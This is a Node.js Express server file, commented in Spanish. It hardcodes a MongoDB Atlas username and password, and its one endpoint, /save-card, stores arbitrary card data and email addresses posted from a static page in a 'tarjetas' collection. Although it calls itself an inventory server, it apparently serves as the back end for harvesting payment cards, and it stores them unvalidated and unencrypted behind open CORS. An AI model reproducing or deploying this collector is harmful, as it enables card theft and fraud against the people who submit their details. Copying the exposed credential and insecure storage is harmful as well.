// server.js
const express = require('express');
const { MongoClient } = require('mongodb'); 
const cors = require('cors'); 
const app = express();

// Usa el puerto asignado por Render (process.env.PORT) o 3000 si es local.
const serverPort = process.env.PORT || 3000;

// =================================================================
// CONFIGURACIÓN DE MONGODB (Conexión persistente y URL corregida)
// =================================================================

// ⚠️ URL de conexión corregida (sin la barra final)
const uri = "mongodb+srv://maxueljoseuwwi_db_user:Maxuel09@cluster0.dfxcysb.mongodb.net"; 
const client = new MongoClient(uri);

// Variable para almacenar la instancia de la base de datos una vez conectada.
let database;

// Función para conectar a MongoDB al iniciar el servidor
async function connectToDatabase() {
    try {
        console.log("Intentando conectar a MongoDB...");
        await client.connect();
        database = client.db("inventario_db");
        console.log("✅ Conexión a MongoDB Atlas exitosa. Base de datos 'inventario_db' lista.");
    } catch (error) {
        console.error('❌ ERROR CRÍTICO: No se pudo conectar a MongoDB.', error);
        // Terminar la aplicación si la conexión falla para evitar problemas
        process.exit(1);
    }
}

// Middlewares
app.use(cors()); 
app.use(express.json());

// =================================================================
// 1. ENDPOINT DE GUARDADO DE TARJETA EN MONGODB
// =================================================================

app.post('/save-card', async (req, res) => {
    // 1. Verificar si la base de datos está disponible
    if (!database) {
        console.error('❌ Base de datos no inicializada. Reintente más tarde.');
        return res.status(503).send({ message: 'Servicio de base de datos no disponible.' });
    }

    const cardData = req.body;
    
    const logEntry = {
        ...cardData, 
        timestamp: new Date()
    };
    
    try {
        // 2. Usar la conexión existente
        const collection = database.collection("tarjetas"); 
        
        await collection.insertOne(logEntry);

        console.log(`✅ Tarjeta (${cardData.tipo_tarjeta}) guardada para: ${cardData.email}`);
        
        // 3. Responder al frontend
        res.status(200).send({ message: 'Datos recibidos y guardados con éxito en la DB.' });

    } catch (error) {
        console.error('❌ Error al insertar documento en MongoDB:', error);
        res.status(500).send({ message: 'Error interno del servidor al insertar datos.' });
    }
});


// =================================================================
// 2. SERVIR ARCHIVOS ESTÁTICOS (Para cargar pagina.html y la carpeta img)
// =================================================================
app.use(express.static(__dirname)); 


// =================================================================
// 3. INICIAR EL SERVIDOR
// =================================================================

// Primero conecta a la base de datos, luego inicia el servidor Express
connectToDatabase().then(() => {
    app.listen(serverPort, () => {
        console.log(`Servidor de inventario iniciado y escuchando en el puerto ${serverPort}`);
    });
});
